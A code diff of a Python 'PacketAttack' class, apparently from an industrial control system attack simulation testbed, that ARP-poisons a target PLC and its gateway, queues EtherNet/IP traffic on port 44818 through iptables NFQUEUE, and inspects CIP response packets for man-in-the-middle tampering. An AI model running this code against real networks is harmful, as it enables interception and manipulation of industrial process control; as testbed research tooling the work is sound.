@@ -29,12 +29,12 @@ class PacketAttack(SyncedAttack):
 
     def setup(self):
         # Add the iptables rules
-        os.system('iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
+        os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
-        launch_arp_poison("192.168.1.1", "192.168.1.254")
+        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
 
         try:
             self.q = self.queue.bind(1)
@@ -51,7 +51,6 @@ class PacketAttack(SyncedAttack):
         while self.run_thread:
             try:
                 for packet in self.queue:
-                    # TODO The actual mitm stuff
                     p = IP(packet.payload)
                     # Packets with 100 <= length < 116 are CIP response packets
                     if 100 <= p[IP].len < 116:
@@ -77,8 +76,10 @@ class PacketAttack(SyncedAttack):
 
 
     def teardown(self):
+        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+
         # Delete iptables rules
-        os.system('iptables -t mangle -D PREROUTING -p tcp -j NFQUEUE --queue-num 1')
+        os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
@@ -87,16 +88,9 @@ class PacketAttack(SyncedAttack):
         self.queue.close()
         self.thread.join()
 
-
     def attack_step(self):
-        if self.state == 0:
-            if self.intermediate_attack['trigger']["start"] <= self.get_master_clock() <= self.intermediate_attack['trigger']["end"]:
-                self.state = 1
-                self.setup()
-        elif self.state == 1:
-            if not self.intermediate_attack['trigger']["start"] <= self.get_master_clock() <= self.intermediate_attack['trigger']["end"]:
-                self.teardown()
-                self.state = 2
+        pass
+
 
 def is_valid_file(parser_instance, arg):
     if not os.path.exists(arg):
